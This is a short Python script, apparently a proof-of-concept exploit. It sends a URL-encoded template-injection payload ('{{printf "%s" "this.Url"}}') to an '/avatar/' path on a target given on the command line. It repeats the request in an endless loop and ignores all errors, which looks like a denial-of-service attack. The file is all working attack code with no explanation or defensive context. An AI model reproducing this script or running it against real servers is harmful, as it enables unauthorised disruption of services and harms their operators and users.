import requests
import sys

payload = sys.argv[1]+r"/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D"

while 1:
	try:
		item = requests.get(payload,timeout=1000)
	except:
		pass

